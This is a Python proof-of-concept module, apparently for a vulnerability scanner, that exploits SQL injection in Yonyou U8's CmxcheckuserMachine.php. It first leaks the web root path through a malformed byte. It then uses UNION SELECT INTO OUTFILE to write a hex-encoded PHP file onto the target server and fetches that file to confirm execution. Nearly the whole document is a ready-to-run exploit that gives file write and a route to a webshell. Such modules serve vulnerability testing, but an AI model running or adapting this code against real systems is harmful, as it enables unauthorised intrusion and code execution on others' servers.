# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import os
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'yongyou_0036' # 平台漏洞编号，留空
    name = '用友优谱u8系统cmxcheckuserMachine.php注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-11-01'  # 漏洞公布时间
    desc = '''
        用友优谱u8系统cmxcheckuserMachine.php注入导致getshell
    ''' # 漏洞描述
    ref = 'https://wooyun.shuimugan.com/bug/view?bug_no=0130069' # 漏洞来源
    cnvd_id = '' # cnvd漏洞编号
    cve_id = '' #cve编号
    product = 'yongyou'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'yongyou_0036' # 平台 POC 编号，留空
    author = '国光'  # POC编写者
    create_date = '2018-05-25' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload='/Server/CmxcheckuserMachine.php?b=1&a=1'
            url = arg + payload
            code1, head1, res1, errcode1, _url1 = hh.http(url+'%bf')
            m = re.findall('<b>(.*?)</b>',res1)
            shell_path = str(os.path.dirname(m[1])) + '\\testvul.php'
            shell_path = re.sub(r'\\',r'\\\\',shell_path)
            exp_code = "'%20and%201=2%20union%20select%200x3c3f706870206563686f206d64352831293b756e6c696e6b285f5f46494c455f5f293b3f3e%20into%20outfile%20'{}'%23".format(shell_path)
            code2, head2, res2, errcode2, _url2 = hh.http(url+exp_code)
            code3, head3, res3, errcode3, _url3 = hh.http(arg+'Server/testvul.php')
            if code3 == 200 and 'c4ca4238a0b923820dcc509a6f75849b' in res3: 
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()